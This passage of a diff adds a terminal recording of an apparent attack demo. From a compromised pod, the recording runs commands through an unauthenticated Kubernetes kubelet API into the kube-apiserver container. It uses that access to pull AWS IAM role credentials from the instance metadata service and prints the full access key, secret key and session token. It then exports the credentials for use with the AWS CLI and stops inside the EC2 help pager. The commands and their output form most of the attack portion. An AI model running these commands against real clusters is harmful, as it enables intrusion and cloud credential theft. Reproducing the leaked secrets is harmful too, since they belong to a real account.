+      "\"containers\":[{\"name\":\"kube-scheduler\",\"image\":\"gcr.io/google_containers/kube-scheduler@sha256:3712116f370e21938e6a55e0f73dc02a4a6f4830a33304127105ed89451ee527\",\"resources\":{}}]},\"status\":{}},{\"metadata\":{\"name\":\"kube-proxy-ip-172-20-57-249.ec2.internal\",\"namespace\":\"kube-system\",\"uid\":\"6303d4681cf06410e5d3510f58037125\",\"creationTimestamp\":null},\"spec\":{\"containers\":[{\"name\":\"kube-proxy\",\"image\":\"gcr.io/google_containers/kube-proxy@sha256:5373a1c294c9ffb2e842d74d3df8fcc5bed68c02af3fb3611c2fd71a411a68fe\",\"resources\":{}}]},\"status\":{}},{\"metadata\":{\"name\":\"etcd-server-ip-172-20-57-249.ec2.internal\",\"namespace\":\"kube-system\",\"uid\":\"1eed1092748e6b7d839ae9f0a9b4823e\",\"creationTimestamp\":null},\"spec\":{\"containers\":[{\"name\":\"etcd-container\",\"image\":\"gcr.io/google_containers/etcd@sha256:19544a655157fb089b62d4dac02bbd095f82ca245dd5e31dd1684d175b109947\",\"resources\":{}}]},\"status\":{}},{\"metadata\":{\"name\":\"kube-controller-manager-ip-172-20-57-249.ec2.internal\",\"namespace\":\"kube-system\",\"uid\":\"de30d6657fc22e90876aa6f7df3b"
+    ],
+    [
+      0.000361,
+      "0d9a\",\"creationTimestamp\":null},\"spec\":{\"containers\":[{\"name\":\"kube-controller-manager\",\"image\":\"gcr.io/google_containers/kube-controller-manager@sha256:7e31b7f71a8c1904c8b38c1681666ef551d0598fbbb4142522b05074ae0c9fd1\",\"resources\":{}}]},\"status\":{}},{\"metadata\":{\"name\":\"calico-policy-controller-3446986630-g1s5c\",\"namespace\":\"kube-system\",\"uid\":\"d42b8b7d-b9fd-11e7-aa33-06d2c9432f28\",\"creationTimestamp\":null},\"spec\":{\"containers\":[{\"name\":\"calico-policy-controller\",\"image\":\"calico/kube-policy-controller@sha256:54b4872a6fff0c8278266d05108da190f374b9500079769306047fc3da30d771\",\"resources\":{}}]},\"status\":{}},{\"metadata\":{\"name\":\"dns-controller-1077516748-s6jxv\",\"namespace\":\"kube-system\",\"uid\":\"d4304301-b9fd-11e7-aa33-06d2c9432f28\",\"creationTimestamp\":null},\"spec\":{\"containers\":[{\"name\":\"dns-controller\",\"image\":\"kope/dns-controller@sha256:3d2f1ed56fbc555b703d3039f9f1b327cba4b25094c60534502558d14aebf9b5\",\"resources\":{}}]},\"status\":{}},{\"metadata\":{\"name\":\"etcd-server-events-ip-172-20-57-249.ec2.internal\",\"namespace\""
+    ],
+    [
+      0.000232,
+      ":\"kube-system\",\"uid\":\"485ca984c005fa2dd8bfe6ead8217c8f\",\"creationTimestamp\":null},\"spec\":{\"containers\":[{\"name\":\"etcd-container\",\"image\":\"gcr.io/google_containers/etcd@sha256:19544a655157fb089b62d4dac02bbd095f82ca245dd5e31dd1684d175b109947\",\"resources\":{}}]},\"status\":{}}]}\r\nroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "c"
+    ],
+    [
+      0.133548,
+      "l"
+    ],
+    [
+      0.057059,
+      "e"
+    ],
+    [
+      0.022288,
+      "a"
+    ],
+    [
+      0.089557,
+      "r"
+    ],
+    [
+      0.136288,
+      "\r\n\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      0.394567,
+      "curl -sk https://172.20.57.24"
+    ],
+    [
+      0.000287,
+      "9:10250/run/kube-system/ku"
+    ],
+    [
+      0.000356,
+      "be \r-apiserver-ip-172-20-57-249.ec2.internal/ku"
+    ],
+    [
+      0.00397,
+      "be-apiserver -d \"cmd=ls /\""
+    ],
+    [
+      2.0,
+      "\r\n"
+    ],
+    [
+      0.070576,
+      "bin\r\ndev\r\netc\r\nhome\r\nproc\r\nroot\r\nsrv\r\nsys\r\ntmp\r\nusr\r\nvar\r\n"
+    ],
+    [
+      0.00067,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "curl -sk https://172.20.57.249:10250/run/kube-system/kube \r-apiserver-ip-172-20-57-249.ec2.internal/kube-apiserver -d \"cmd=wget\""
+    ],
+    [
+      1.193266,
+      "\r\n"
+    ],
+    [
+      0.085932,
+      "command 'wget' exited with 1: BusyBox v1.27.1 (2017-07-19 20:55:39 UTC) multi-call binary.\r\n\r\nUsage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]\r\n\t[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]\r\n\t[-S|--server-response] [-U|--user-agent AGENT] [-T SEC] URL...\r\n\r\nRetrieve files via HTTP or FTP\r\n\r\n\t--spider\tOnly check URL existence: $? is 0 if exists\r\n\t-c\t\tContinue retrieval of aborted transfer\r\n\t-q\t\tQuiet\r\n\t-P DIR\t\tSave to DIR (default .)\r\n\t-S    \t\tShow server response\r\n\t-T SEC\t\tNetwork read timeout is SEC seconds\r\n\t-O FILE\t\tSave to FILE ('-' for stdout)\r\n\t-U STR\t\tUse STR for User-Agent header\r\n\t-Y on/off\tUse proxy\r\nroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      1.066186,
+      "c"
+    ],
+    [
+      0.190779,
+      "l"
+    ],
+    [
+      0.069835,
+      "e"
+    ],
+    [
+      0.076392,
+      "a"
+    ],
+    [
+      0.089265,
+      "r"
+    ],
+    [
+      0.819282,
+      "\r\n"
+    ],
+    [
+      0.00062,
+      "\u001b[3;J\u001b[H\u001b[2J"
+    ],
+    [
+      0.000128,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "curl -sk https://172.20.57.249:10250/run/kube-system/kube \r-apiserver-ip-172-20-57-249.ec2.internal/kube-apiserver -d \"cmd=wget -q -O - http://169.25 \r4.169.254/latest/meta-data/iam/security-credentials/\""
+    ],
+    [
+      1.725851,
+      "\r\n"
+    ],
+    [
+      0.116415,
+      "masters.kube.lonimbus.com"
+    ],
+    [
+      0.000913,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "curl -sk https://172.20.57.249:10250/run/kube-system/kube \r-ap"
+    ],
+    [
+      0.004824,
+      "iserver-ip-172-20-57-249.ec2.internal/"
+    ],
+    [
+      0.000124,
+      "kube-apiserver -d \"cmd=wget -q -O - http://169.25 \r4.169.254/latest/meta-data/iam/security-credentials/masters.kube.lon"
+    ],
+    [
+      7.5e-05,
+      "imbus.com\""
+    ],
+    [
+      0.32646,
+      "\r\n"
+    ],
+    [
+      0.063829,
+      "{\r\n  \"Code\" : \"Success\",\r\n  \"LastUpdated\" : \"2017-10-26T06:00:36Z\",\r\n  \"Type\" : \"AWS-HMAC\",\r\n  \"AccessKeyId\" : \"ASIAJ7TH3LDQOGI5YKPA\",\r\n  \"SecretAccessKey\" : \"v9NsW8sgZxZySfZQjhfJ9KQGaQEhn0B2I2Rl7TnI\",\r\n  \"Token\" : \"FQoDYXdzEFcaDEV/sxTn2DsphRnFISK3A4JE3HrIEdLf7G1mDFQesS/zCuPd+LgWrPyBUFf8MkyJUr/z9e8hLZGA+MJuCRZ0s7Kr9AyXOlegj6YpwBWJdnrPT8A0cwgYX3pfZeuhlhl8hXwODQjilHWvP9yC5HZcUFlgx8hAFxLTUUSls3E85VVkekujKqY+BxeFu3dJVnSat1bNknUwPuHQ+RuyK956UN98IyvZne5HHW/Dl9w5/wooEhVLXLeZPdauNbOlI6rIf4VeMva84ERHlk4GMZ/ss3lV9UU5YHV2Y/HO/fn8ERHmUObTU2OuF43ztGlumbxC09KjZO3BwpTLVKnUEnW24fU/H4dG+h+itwESQBbtGhq4kr7gz/YaGbC2wZUequjMxc5Ok240e92TmkQQ3dI5ZyFGDUy3L34BuTNFnmm3sbktiNrYUKE05w7nkoUw7LTpUWa48sEXDlpk6+sm6LJIHAtH1feu+xHO8LShoyacrOcHZD0s/7gQ8dxn60ifj59zvEhQHKIcPgeRDLmbOmdEI+KjI2mb5lnvj+wxJHlH/d7xq1jC2o7O65+6S3n97TUvreBb1M8yEbmZ5JAw0SVyqATROWb3+bMo+/PFzwU=\",\r\n  \"Expiration\" : \"2017-10-26T12:24:46Z\"\r\n}"
+    ],
+    [
+      0.000668,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "c"
+    ],
+    [
+      0.206125,
+      "l"
+    ],
+    [
+      0.017121,
+      "e"
+    ],
+    [
+      0.136241,
+      "a"
+    ],
+    [
+      0.089371,
+      "r"
+    ],
+    [
+      0.112186,
+      "\r\n"
+    ],
+    [
+      0.000257,
+      "\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      0.330099,
+      "curl -sk https://172.20.57.249:10250/run/kube-sys"
+    ],
+    [
+      0.000217,
+      "tem/kube \r-apiserver-ip-172-20-57-249.ec2.intern"
+    ],
+    [
+      0.000409,
+      "al/kube-apiserver -d \"cmd=wget -q -O "
+    ],
+    [
+      0.0024,
+      "- http://169.25 \r4.169.254/latest/meta-data/iam/security-credentials/masters.kube.lonimbus.com\" > master.js \ron"
+    ],
+    [
+      0.858706,
+      "\r\n"
+    ],
+    [
+      0.08056,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      1.321973,
+      "c"
+    ],
+    [
+      0.127599,
+      "a"
+    ],
+    [
+      0.078975,
+      "t"
+    ],
+    [
+      0.091585,
+      " "
+    ],
+    [
+      0.066854,
+      "m"
+    ],
+    [
+      0.05514,
+      "a"
+    ],
+    [
+      0.113827,
+      "s"
+    ],
+    [
+      0.246019,
+      "ter.json "
+    ],
+    [
+      0.219246,
+      "\r\n"
+    ],
+    [
+      0.000906,
+      "{\r\n  \"Code\" : \"Success\",\r\n  \"LastUpdated\" : \"2017-10-26T06:00:36Z\",\r\n  \"Type\" : \"AWS-HMAC\",\r\n  \"AccessKeyId\" : \"ASIAJ7TH3LDQOGI5YKPA\",\r\n  \"SecretAccessKey\" : \"v9NsW8sgZxZySfZQjhfJ9KQGaQEhn0B2I2Rl7TnI\",\r\n  \"Token\" : \"FQoDYXdzEFcaDEV/sxTn2DsphRnFISK3A4JE3HrIEdLf7G1mDFQesS/zCuPd+LgWrPyBUFf8MkyJUr/z9e8hLZGA+MJuCRZ0s7Kr9AyXOlegj6YpwBWJdnrPT8A0cwgYX3pfZeuhlhl8hXwODQjilHWvP9yC5HZcUFlgx8hAFxLTUUSls3E85VVkekujKqY+BxeFu3dJVnSat1bNknUwPuHQ+RuyK956UN98IyvZne5HHW/Dl9w5/wooEhVLXLeZPdauNbOlI6rIf4VeMva84ERHlk4GMZ/ss3lV9UU5YHV2Y/HO/fn8ERHmUObTU2OuF43ztGlumbxC09KjZO3BwpTLVKnUEnW24fU/H4dG+h+itwESQBbtGhq4kr7gz/YaGbC2wZUequjMxc5Ok240e92TmkQQ3dI5ZyFGDUy3L34BuTNFnmm3sbktiNrYUKE05w7nkoUw7LTpUWa48sEXDlpk6+sm6LJIHAtH1feu+xHO8LShoyacrOcHZD0s/7gQ8dxn60ifj59zvEhQHKIcPgeRDLmbOmdEI+KjI2mb5lnvj+wxJHlH/d7xq1jC2o7O65+6S3n97TUvreBb1M8yEbmZ5JAw0SVyqATROWb3+bMo+/PFzwU=\",\r\n  \"Expiration\" : \"2017-10-26T12:24:46Z\"\r\n}root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      1.041668,
+      "c"
+    ],
+    [
+      0.178582,
+      "l"
+    ],
+    [
+      0.056692,
+      "e"
+    ],
+    [
+      0.079557,
+      "a"
+    ],
+    [
+      0.06672,
+      "r"
+    ],
+    [
+      0.245893,
+      "\r\n"
+    ],
+    [
+      0.000633,
+      "\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "export AWS_REGION="
+    ],
+    [
+      0.002693,
+      "us-east-1\r\nroot@vulnweb-2569941405-q8v9r:/# export AWS_ACCESS_KEY_ID=$(cat master.json | grep AccessK \reyId | cut -d'\"' -f4)\r\n"
+    ],
+    [
+      0.003226,
+      "root@vulnweb-2569941405-q8v9r:/# export AWS_SECRET_ACCESS_KEY=$(cat master.json | grep Sec \rretAccessKey | cut -d'\"' -f4)\r\n"
+    ],
+    [
+      0.002516,
+      "root@vulnweb-2569941405-q8v9r:/# export AWS_SESSION_TOKEN=$(cat master.json | gr"
+    ],
+    [
+      0.00041,
+      "ep Token | \r cut -d'\"' -f"
+    ],
+    [
+      8.9e-05,
+      "4)"
+    ],
+    [
+      0.356242,
+      "\r\n"
+    ],
+    [
+      0.002929,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      1.124644,
+      "c"
+    ],
+    [
+      0.111883,
+      "l"
+    ],
+    [
+      0.112271,
+      "e"
+    ],
+    [
+      0.068588,
+      "a"
+    ],
+    [
+      0.068741,
+      "r"
+    ],
+    [
+      0.132392,
+      "\r\n"
+    ],
+    [
+      0.00076,
+      "\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "aws ec2 help"
+    ],
+    [
+      0.31502,
+      "\r\n"
+    ],
+    [
+      0.478477,
+      "\u001b[?1049h\u001b[?1h\u001b=\rEC2()                                                                    EC2()\u001b[m\r\n\u001b[m\r\n\u001b[m\r\n\u001b[m\r\n\u001b[1mNAME\u001b[0m\u001b[m\r\n       ec2 -\u001b[m\r\n\u001b[m\r\n\u001b[1mDESCRIPTION\u001b[0m\u001b[m\r\n       Amazon  Elastic Compute Cloud (Amazon EC2) provides resizable computing\u001b[m\r\n       capacity in the Amazon Web Services (AWS) cloud. Using Amazon EC2 elim-\u001b[m\r\n       inates your need to invest in hardware up front, so you can develop and\u001b[m\r\n       deploy applications faster.\u001b[m\r\n\u001b[m\r\n\u001b[1mAVAILABLE\u001b[0m \u001b[1mCOMMANDS\u001b[0m\u001b[m\r\n       o accept-reserved-instances-exchange-quote\u001b[m\r\n\u001b[m\r\n       o accept-vpc-peering-connection\u001b[m\r\n\u001b[m\r\n       o allocate-address\u001b[m\r\n\u001b[m\r\n       o allocate-hosts\u001b[m\r\n\u001b[m\r\n       o assign-ipv6-addresses\u001b[m\r\n\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.913105,
+      "\r\u001b[K       o assign-private-ip-addresses\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.269929,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.473701,
+      "\r\u001b[K       o associate-address\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.585063,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036464,
+      "\r\u001b[K       o associate-dhcp-options\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034625,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034942,
+      "\r\u001b[K       o associate-iam-instance-profile\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.282934,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.352515,
+      "\r\u001b[K       o associate-route-table\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.583054,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036582,
+      "\r\u001b[K       o associate-subnet-cidr-block\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.042859,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.024057,
+      "\r\u001b[K       o associate-vpc-cidr-block\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040577,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.028565,
+      "\r\u001b[K       o attach-classic-link-vpc\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040907,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.361836,
+      "\r\u001b[K       o attach-internet-gateway\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.586632,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034379,
+      "\r\u001b[K       o attach-network-interface\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032911,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036397,
+      "\r\u001b[K       o attach-volume\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036884,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034154,
+      "\r\u001b[K       o attach-vpn-gateway\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.03846,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.03471,
+      "\r\u001b[K       o authorize-security-group-egress\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034491,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.035032,
+      "\r\u001b[K       o authorize-security-group-ingress\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034341,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036239,
+      "\r\u001b[K       o bundle-instance\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034781,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032388,
+      "\r\u001b[K       o cancel-bundle-task\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.051622,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.021333,
+      "\r\u001b[K       o cancel-conversion-task\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.041297,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.028507,
+      "\r\u001b[K       o cancel-export-task\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.035973,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.030474,
+      "\r\u001b[K       o cancel-import-task\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036472,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034666,
+      "\r\u001b[K       o cancel-reserved-instances-listing\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034902,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.03423,
+      "\r\u001b[K       o cancel-spot-fleet-requests\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.047182,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.395956,
+      "\r\u001b[K       o cancel-spot-instance-requests\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.597765,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.030721,
+      "\r\u001b[K       o confirm-product-instance\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.023655,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038451,
+      "\r\u001b[K       o copy-fpga-image\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032386,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032469,
+      "\r\u001b[K       o copy-image\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.03748,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.0298,
+      "\r\u001b[K       o copy-snapshot\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.037306,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.044262,
+      "\r\u001b[K       o create-customer-gateway\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.026508,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040265,
+      "\r\u001b[K       o create-default-vpc\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.19918,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.583857,
+      "\r\u001b[K       o create-dhcp-options\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.037605,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034648,
+      "\r\u001b[K       o create-egress-only-internet-gateway\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034421,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040831,
+      "\r\u001b[K       o create-flow-logs\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.028854,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040202,
+      "\r\u001b[K       o create-fpga-image\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.026153,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.037212,
+      "\r\u001b[K       o create-image\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.029738,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.037119,
+      "\r\u001b[K       o create-instance-export-task\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.033299,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.035461,
+      "\r\u001b[K       o create-internet-gateway\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.986426,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.580625,
+      "\r\u001b[K       o create-key-pair\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036296,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034431,
+      "\r\u001b[K       o create-nat-gateway\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.039761,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032461,
+      "\r\u001b[K       o create-network-acl\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.044122,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.028395,
+      "\r\u001b[K       o create-network-acl-entry\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.310503,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.585622,
+      "\r\u001b[K       o create-network-interface\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038273,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038466,
+      "\r\u001b[K       o create-network-interface-permission\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.030476,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036486,
+      "\r\u001b[K       o create-placement-group\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.035299,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.033741,
+      "\r\u001b[K       o create-reserved-instances-listing\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036627,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.042862,
+      "\r\u001b[K       o create-route\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.385532,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.585629,
+      "\r\u001b[K       o create-route-table\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038488,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.042409,
+      "\r\u001b[K       o create-security-group\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.028417,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034866,
+      "\r\u001b[K       o create-snapshot\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034358,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034701,
+      "\r\u001b[K       o create-spot-datafeed-subscription\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034471,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.03853,
+      "\r\u001b[K       o create-subnet\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.045073,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.024124,
+      "\r\u001b[K       o create-tags\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.03647,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032547,
+      "\r\u001b[K       o create-volume\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.079349,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.596302,
+      "\r\u001b[K       o create-vpc\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.025968,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.04013,
+      "\r\u001b[K       o create-vpc-endpoint\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.028311,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036604,
+      "\r\u001b[K       o create-vpc-peering-connection\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.030052,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.035234,
+      "\r\u001b[K       o create-vpn-connection\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032158,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.03445,
+      "\r\u001b[K       o create-vpn-connection-route\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036672,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.033268,
+      "\r\u001b[K       o create-vpn-gateway\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.033585,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036461,
+      "\r\u001b[K       o delete-customer-gateway\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034669,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034885,
+      "\r\u001b[K       o delete-dhcp-options\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036436,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038897,
+      "\r\u001b[K       o delete-egress-only-internet-gateway\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.028077,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036622,
+      "\r\u001b[K       o delete-flow-logs\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038245,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.024859,
+      "\r\u001b[K       o delete-fpga-image\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040632,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.035371,
+      "\r\u001b[K       o delete-internet-gateway\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.025354,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038548,
+      "\r\u001b[K       o delete-key-pair\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.030273,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036956,
+      "\r\u001b[K       o delete-nat-gateway\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032232,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036784,
+      "\r\u001b[K       o delete-network-acl\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032522,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032336,
+      "\r\u001b[K       o delete-network-acl-entry\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040678,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.03242,
+      "\r\u001b[K       o delete-network-interface\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.042962,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.026221,
+      "\r\u001b[K       o delete-network-interface-permission\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040794,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.028099,
+      "\r\u001b[K       o delete-placement-group\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036987,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.030091,
+      "\r\u001b[K       o delete-route\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038787,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.039151,
+      "\r\u001b[K       o delete-route-table\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.028097,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040143,
+      "\r\u001b[K       o delete-security-group\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036897,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036815,
+      "\r\u001b[K       o delete-snapshot\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.030261,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036821,
+      "\r\u001b[K       o delete-spot-datafeed-subscription\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.030944,
